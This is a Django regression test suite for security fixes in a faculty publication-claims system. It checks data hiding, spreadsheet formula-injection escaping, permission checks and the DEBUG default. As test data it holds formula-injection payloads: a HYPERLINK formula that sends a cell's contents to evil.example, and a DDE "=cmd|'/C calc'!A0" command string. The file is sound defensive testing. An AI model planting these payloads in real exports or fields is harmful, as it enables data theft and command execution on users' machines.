"""Regression tests for the red-team review of the security rules.

Each probe the review wrote (asserting the breach) is ported here asserting
the fix instead.
"""
from __future__ import annotations

import csv
import io
import json
import re
from datetime import date, timedelta

from django.apps import apps
from django.db import IntegrityError, transaction
from django.test import Client
from django.urls import URLPattern, URLResolver, get_resolver
from django.utils import timezone

from core.models import (
    AuditLog, CalendarFeed, Claim, ClaimAction, ClaimStatus, JournalWatch, PaidLedger, Role,
    ScoutRun, User,
)
from core.services.cell_safe import csv_writer, dict_writer, safe_append, safe_cell
from core.test_chain_rules import ChainBase

EVIL = '=HYPERLINK("http://evil.example/?x="&A1,"open")'
LIVE = ("=", "+", "-", "@", "\t", "\r")


def _csv_cells(content: bytes) -> list[str]:
    text = content.decode("utf-8-sig")
    return [cell for row in csv.reader(io.StringIO(text)) for cell in row]


def _xlsx_formulas(content: bytes) -> list:
    from openpyxl import load_workbook

    wb = load_workbook(io.BytesIO(content))
    return [(ws.title, c.coordinate, c.value) for ws in wb for row in ws.iter_rows() for c in row
            if c.data_type == "f"]


# ---- 1 + 3: the claimant never learns the desk ----------------------------


class ClaimantShape(ChainBase):
    DESK = ("status", "waiting_days", "cleared_at", "principal_approved_at", "director_approved_at")

    def _assert_claimant_shape(self, body):
        for key in self.DESK:
            self.assertNotIn(key, body)
        self.assertEqual(body["faculty_stage"], "Under review")
        self.assertEqual(body["days_waiting"], 20)
        self.assertNotIn("journal_watch", body)
        for step in body.get("actions", []):
            self.assertNotIn("from_status", step)
            self.assertNotIn("to_status", step)

    def _cleared(self, owner, ticket):
        now = timezone.now()
        c = self._claim(status=ClaimStatus.CLEARED, ticket=ticket, owner=owner)
        Claim.objects.filter(pk=c.pk).update(submitted_at=now - timedelta(days=20),
                                             cleared_at=now - timedelta(days=2), cleared_by=self.cell)
        ClaimAction.objects.create(claim=c, actor=self.cell, from_status=ClaimStatus.SUBMITTED,
                                   to_status=ClaimStatus.CLEARED, action="CLEAR")
        JournalWatch.objects.create(title="Nature", reason="SECRET-DESK-REASON", added_by=self.cell)
        return c

    def test_faculty_own_claim_has_no_desk_status_timestamps_or_watch(self):
        c = self._cleared(self.faculty, "SR-1")
        body = self._as(self.faculty).get(f"/api/claims/{c.id}").json()
        self._assert_claimant_shape(body)
        self.assertNotIn("SECRET-DESK-REASON", json.dumps(body))

    def test_faculty_claim_list_has_no_desk_status(self):
        self._cleared(self.faculty, "SR-2")
        body = self._as(self.faculty).get("/api/claims").json()
        self.assertNotIn('"CLEARED"', json.dumps(body))
        self.assertNotIn("SECRET-DESK-REASON", json.dumps(body))

    def test_officer_own_claim_gets_the_claimant_shape(self):
        c = self._cleared(self.director, "SR-3")
        body = self._as(self.director).get(f"/api/claims/{c.id}").json()
        self._assert_claimant_shape(body)

    def test_me_publications_stage_is_the_faculty_stage(self):
        from core.models import Authorship, Publication

        now = timezone.now()
        p = Publication.objects.create(doi="10.1234/rt.1", title="Red Team Paper", year=2025)
        Authorship.objects.create(publication=p, user=self.faculty, is_college=True, position=1,
                                  display_name="Asha Faculty", author_key="asha")
        c = self._claim(status=ClaimStatus.PRINCIPAL_APPROVED, ticket="SR-4", doi="10.1234/rt.1",
                        paper_title="Red Team Paper")
        Claim.objects.filter(pk=c.pk).update(submitted_at=now - timedelta(days=30),
                                             cleared_at=now - timedelta(days=9),
                                             principal_approved_at=now - timedelta(days=1))
        body = self._as(self.faculty).get("/api/me/publications").json()
        rows = [x["claim"] for x in body["publications"] if x.get("title") == "Red Team Paper"]
        self.assertEqual(rows[0]["stage"], "Under review")
        self.assertEqual(rows[0]["days_waiting"], 30)


class JournalWatchHidden(ChainBase):
    def test_watchlist_reason_does_not_reach_director_or_finance(self):
        a = self._claim(status=ClaimStatus.PRINCIPAL_APPROVED, ticket="SR-5")
        b = self._claim(status=ClaimStatus.DIRECTOR_APPROVED, ticket="SR-6")
        JournalWatch.objects.create(title="Nature", reason="SECRET-WATCH predatory", added_by=self.cell)
        for who, path in ((self.director, f"/api/claims/{a.id}"), (self.director, "/api/director/queue"),
                          (self.finance, f"/api/claims/{b.id}"), (self.finance, "/api/claims")):
            body = self._as(who).get(path).content.decode()
            self.assertNotIn("SECRET-WATCH", body, path)
            self.assertNotIn('"journal_watch"', body, path)

    def test_the_cell_still_sees_it(self):
        a = self._claim(status=ClaimStatus.SUBMITTED, ticket="SR-7")
        JournalWatch.objects.create(title="Nature", reason="SECRET-WATCH", added_by=self.cell)
        body = self._as(self.cell).get(f"/api/claims/{a.id}").json()
        self.assertIn("SECRET-WATCH", json.dumps(body))


# ---- 2: formula injection -------------------------------------------------


class CellSafeHelper(ChainBase):
    def test_strings_escaped_numbers_kept(self):
        for v in ("=1+1", "+1", "-2+3", "@SUM(1)", "\t=1", "\r=1"):
            self.assertEqual(safe_cell(v), "'" + v)
        self.assertEqual(safe_cell(-5), -5)
        self.assertEqual(safe_cell(3.5), 3.5)
        self.assertEqual(safe_cell("Nature"), "Nature")
        self.assertIsNone(safe_cell(None))

    def test_writers(self):
        buf = io.StringIO()
        csv_writer(buf).writerow(["=1", 2])
        dw = dict_writer(buf, ["a"])
        dw.writerow({"a": "@x"})
        self.assertEqual(buf.getvalue().splitlines(), ["'=1,2", "'@x"])
        from openpyxl import Workbook

        ws = Workbook().active
        safe_append(ws, ["=1+1", 7])
        self.assertEqual(ws["A1"].data_type, "s")
        self.assertEqual(ws["B1"].value, 7)


class FormulaInjection(ChainBase):
    def test_clearing_report_csv(self):
        c = self._claim(status=ClaimStatus.SUBMITTED, ticket="SR-8", paper_title=EVIL)
        ClaimAction.objects.create(claim=c, actor=self.cell, from_status=ClaimStatus.SUBMITTED,
                                   to_status=ClaimStatus.REJECTED, action="REJECT", note="-2+3")
        r = self._as(self.cell).get("/api/admin/clearing-report?format=csv")
        self.assertEqual(r.status_code, 200)
        self.assertFalse([x for x in _csv_cells(r.content) if x.startswith(LIVE)])

    def test_hod_report_xlsx(self):
        self._claim(status=ClaimStatus.SUBMITTED, ticket="SR-9", paper_title=EVIL,
                    publication_year=timezone.localdate().year)
        r = self._as(self.hod).get("/api/hod/report?fmt=xlsx")
        self.assertEqual(r.status_code, 200, r.content[:300])
        self.assertEqual(_xlsx_formulas(r.content), [])

    def test_bank_csv(self):
        PaidLedger.objects.create(payout_month=date(2026, 8, 1), amount=1000, department="CSE",
                                  faculty_name="=cmd|'/C calc'!A0", staff_id="@SUM(1)", voucher_number="+V1")
        r = self._as(self.finance).get("/api/payouts/statement.csv?month=2026-08")
        self.assertEqual(r.status_code, 200)
        self.assertFalse([x for x in _csv_cells(r.content) if x.startswith(LIVE)])

    def test_my_statement_csv(self):
        PaidLedger.objects.create(payout_month=date(2025, 8, 1), amount=1000, department="CSE",
                                  faculty_name="Asha", staff_id="STF-CH1", paper_title=EVIL,
                                  journal_title="@evil")
        r = self._as(self.faculty).get("/api/me/payments/statement?format=csv")
        self.assertEqual(r.status_code, 200)
        self.assertFalse([x for x in _csv_cells(r.content) if x.startswith(LIVE)])

    def test_audit_csv(self):
        u = User.objects.create_user(email="evil@test.edu", password=None, name="=1+2", role=Role.FACULTY)
        AuditLog.objects.create(actor=u, action="X", entity="Claim", entity_id="+abc")
        r = self._as(self.admin).get("/api/admin/audit.csv")
        self.assertEqual(r.status_code, 200)
        self.assertFalse([x for x in _csv_cells(r.content) if x.startswith(LIVE)])

    def test_leaderboard_csv(self):
        User.objects.filter(pk=self.faculty.pk).update(name="=1+1 Asha")
        r = self._as(self.faculty).get("/api/leaderboard?fmt=csv")
        if r.status_code == 200:
            self.assertFalse([x for x in _csv_cells(r.content) if x.startswith(("=", "@", "+"))])

    def test_brief_xlsx_department(self):
        User.objects.create_user(email="d@test.edu", password=None, name="Dept Person", role=Role.FACULTY,
                                 department="=1+1")
        r = self._as(self.principal).get("/api/reports/brief/export?fmt=xlsx")
        self.assertEqual(r.status_code, 200)
        self.assertEqual(_xlsx_formulas(r.content), [])

    def test_report_builder(self):
        self._claim(status=ClaimStatus.SUBMITTED, ticket="SR-30", journal_title='=HYPERLINK("http://e.example","j")')
        x = self._as(self.principal).get("/api/reports/build?dimensions=journal&fmt=xlsx")
        c = self._as(self.principal).get("/api/reports/build?dimensions=journal&fmt=csv")
        self.assertEqual((x.status_code, c.status_code), (200, 200))
        self.assertEqual(_xlsx_formulas(x.content), [])
        self.assertFalse([v for v in _csv_cells(c.content) if v.startswith("=")])

    def test_accreditation_pack(self):
        from core.models import Authorship, Publication

        self._claim(status=ClaimStatus.SUBMITTED, ticket="SR-40", paper_title="=1+1", publication_year=2025)
        p = Publication.objects.create(title="=2+2 harvested", year=2025, doi="10.9/ext")
        Authorship.objects.create(publication=p, user=self.faculty, is_college=True, position=1,
                                  display_name="Asha Faculty", author_key="asha2")
        x = self._as(self.principal).get("/api/reports/pack?fmt=xlsx&year=2025")
        c = self._as(self.principal).get("/api/reports/pack?fmt=csv&year=2025")
        if x.status_code == 200:
            self.assertEqual(_xlsx_formulas(x.content), [])
        if c.status_code == 200:
            self.assertFalse([v for v in _csv_cells(c.content) if v.startswith("=")])

    def test_no_bare_writers_left(self):
        """Every CSV/XLSX writer goes through core.services.cell_safe."""
        from pathlib import Path

        root = Path(__file__).resolve().parent
        offenders = []
        for sub in ("api", "services"):
            for f in (root / sub).rglob("*.py"):
                if f.name == "cell_safe.py":
                    continue
                text = f.read_text(encoding="utf-8")
                if re.search(r"csv\.(writer|DictWriter)\(|\bws\.append\(", text):
                    offenders.append(f.name)
        self.assertEqual(offenders, [])


# ---- 4: own claim ---------------------------------------------------------


class OwnClaim(ChainBase):
    def test_pack_row_edit_refuses_own_claim(self):
        own = self._claim(status=ClaimStatus.SUBMITTED, ticket="SR-10", owner=self.cell, publication_year=2025)
        r = self._as(self.cell).patch(f"/api/reports/pack/rows/{own.id}",
                                      data=json.dumps({"field": "publication_year", "value": "2024",
                                                       "reason": "self-serving change"}),
                                      content_type="application/json")
        own.refresh_from_db()
        self.assertEqual(r.status_code, 403)
        self.assertEqual(own.publication_year, 2025)

    def test_batch_verify_refuses_own_claim(self):
        own = self._claim(status=ClaimStatus.SUBMITTED, ticket="SR-11", owner=self.cell)
        batch = self._post(self.cell, "/api/admin/process/batch", {"claim_ids": [str(own.id)]})
        self.assertEqual(batch.status_code, 403)
        from core.tasks import run_bulk_verify

        res = run_bulk_verify([own.id], self.cell.id)
        self.assertEqual(res["verified"], [])
        self.assertFalse(ClaimAction.objects.filter(claim=own, actor=self.cell, action="VERIFY").exists())


# ---- 5: view-as writes nothing --------------------------------------------


def _get_routes(resolver=None, prefix=""):
    resolver = resolver or get_resolver()
    for p in resolver.url_patterns:
        route = prefix + str(p.pattern)
        if isinstance(p, URLResolver):
            yield from _get_routes(p, route)
        elif isinstance(p, URLPattern):
            yield route


class ViewAsReadOnly(ChainBase):
    def _view_as(self, target):
        self.client.force_login(self.admin)
        r = self.client.post(f"/api/admin/impersonate/{target.id}")
        self.assertEqual(r.status_code, 200, r.content)
        return self.client

    def test_get_hod_report_writes_no_audit_row(self):
        c = self._view_as(self.hod)
        r = c.get("/api/hod/report?fmt=xlsx")
        self.assertEqual(r.status_code, 200)
        self.assertFalse(AuditLog.objects.filter(action="HOD_REPORT").exists())

    def test_get_scout_does_not_mutate(self):
        run = ScoutRun.objects.create(user=self.faculty)
        ScoutRun.objects.filter(pk=run.pk).update(created_at=timezone.now() - timedelta(hours=1))
        c = self._view_as(self.faculty)
        c.get("/api/scout")
        run.refresh_from_db()
        self.assertEqual(run.status, ScoutRun.Status.QUEUED)

    def test_post_refused_while_viewing(self):
        c = self._view_as(self.cell)
        r = c.post("/api/admin/journal-watch", data=json.dumps({"issn": "1234-5678", "reason": "x"}),
                   content_type="application/json")
        self.assertEqual(r.status_code, 403)

    def test_every_get_route_writes_nothing_while_viewing(self):
        claim = self._claim(status=ClaimStatus.SUBMITTED, ticket="SR-12")
        models = [m for m in apps.get_models() if m._meta.app_label == "core"]

        def counts():
            return {m.__name__: m.objects.count() for m in models}

        c = self._view_as(self.faculty)
        c.raise_request_exception = False
        paths = set()
        for route in _get_routes():
            if not route.startswith("api/"):
                continue
            path = "/" + route.replace("^", "").replace("$", "")
            path = re.sub(r"<(?:\w+:)?(claim_id|id)>", str(claim.id), path)
            if "<" in path or "(" in path:
                continue
            paths.add(path)
        self.assertGreater(len(paths), 50)
        before = counts()
        audit_before = AuditLog.objects.count()
        for path in sorted(paths):
            c.get(path)
            self.assertEqual(AuditLog.objects.count(), audit_before, path)
        self.assertEqual(counts(), before)


# ---- 6: ICS feed ----------------------------------------------------------


class CalendarRules(ChainBase):
    def test_deactivated_users_ics_feed_is_refused(self):
        CalendarFeed.objects.create(user=self.faculty, token="t" * 40)
        User.objects.filter(pk=self.faculty.pk).update(active=False)
        r = Client().get(f"/api/calendar/feed/{'t' * 40}.ics")
        self.assertEqual(r.status_code, 404)

    def test_hod_calendar_has_no_college_payout_run(self):
        User.objects.create_user(email="o@test.edu", password=None, name="Other", role=Role.FACULTY,
                                 department="ECE", staff_id="S-O")
        m = timezone.localdate().replace(day=1)
        PaidLedger.objects.create(payout_month=m, amount=99999, department="ECE", faculty_name="Other",
                                  staff_id="S-O", paper_title="Their paper")
        r = self._as(self.hod).get(f"/api/calendar?start={m.isoformat()}&end={(m + timedelta(days=27)).isoformat()}")
        body = r.content.decode()
        self.assertEqual(r.status_code, 200)
        self.assertNotIn("99999", body)
        self.assertNotIn("College payout run", body)


# ---- 7: staff ids ---------------------------------------------------------


class StaffIdCase(ChainBase):
    def test_case_variant_staff_ids_cannot_coexist(self):
        User.objects.create_user(email="a1@test.edu", password=None, name="Anil A", role=Role.FACULTY,
                                 staff_id="sec123")
        with self.assertRaises(IntegrityError), transaction.atomic():
            User.objects.create_user(email="b1@test.edu", password=None, name="Bala B", role=Role.FACULTY,
                                     staff_id="SEC123")

    def test_unique_case_variant_still_matches(self):
        a = User.objects.create_user(email="a2@test.edu", password=None, name="Anil A", role=Role.FACULTY,
                                     staff_id="sec999")
        PaidLedger.objects.create(payout_month=date(2025, 8, 1), amount=4321, department="CSE",
                                  faculty_name="Anil A", staff_id="SEC999", paper_title="Anil's paper")
        from core.api.my_payments import ledger_for

        self.assertEqual([r.paper_title for r in ledger_for(a)], ["Anil's paper"])


# ---- 8: bank file ---------------------------------------------------------


class BankFile(ChainBase):
    def test_bank_csv_is_finance_and_super_admin_only(self):
        PaidLedger.objects.create(payout_month=date(2026, 8, 1), amount=10, department="CSE",
                                  faculty_name="A", staff_id="S1")
        for who, code in ((self.finance, 200), (self.admin, 200), (self.director, 403),
                          (self.principal, 403), (self.cell, 403)):
            r = self._as(who).get("/api/payouts/statement.csv?month=2026-08")
            self.assertEqual(r.status_code, code, who.role)


# ---- 9: DEBUG default -----------------------------------------------------


class DebugDefault(ChainBase):
    def test_debug_defaults_off(self):
        import subprocess
        import sys
        import os
        from pathlib import Path

        env = {k: v for k, v in os.environ.items() if k != "DJANGO_DEBUG"}
        env["DJANGO_SECRET_KEY"] = "x" * 50
        env["DJANGO_USE_SQLITE"] = "true"
        out = subprocess.run(
            [sys.executable, "-c", "import config.settings as s; print(s.DEBUG)"],
            cwd=Path(__file__).resolve().parents[1], env=env, capture_output=True, text=True,
        )
        self.assertEqual(out.stdout.strip().splitlines()[-1], "False", out.stderr)

    def test_render_does_not_turn_debug_on(self):
        from pathlib import Path

        text = (Path(__file__).resolve().parents[2] / "render.yaml").read_text(encoding="utf-8")
        m = re.search(r"key: DJANGO_DEBUG\s+value: \"?(\w+)", text)
        self.assertTrue(m is None or m.group(1).lower() == "false")

    def test_seed_demo_refuses_without_debug(self):
        from django.core.management import CommandError, call_command
        from django.test import override_settings

        with override_settings(DEBUG=False), self.assertRaises(CommandError):
            call_command("seed_demo")


# ---- 10: faces ------------------------------------------------------------


class Faces(ChainBase):
    def test_erp_row_matches_by_staff_id_not_same_name(self):
        from core.api.duplicates import _add_faces

        User.objects.create_user(email="n1@test.edu", password=None, name="Same Name", role=Role.FACULTY,
                                 staff_id="E1", photo="site/right.jpg")
        User.objects.create_user(email="n2@test.edu", password=None, name="Same Name", role=Role.FACULTY,
                                 staff_id="E2", photo="site/wrong.jpg")

        class F:
            id = 1
            faculty_name = "Same Name"

        rows = {1: [{"id": "x", "source": "erp", "person": "Same Name", "person_key": "e1"}]}
        _add_faces([F()], rows)
        self.assertTrue(rows[1][0]["photo_url"].endswith("site/right.jpg"))
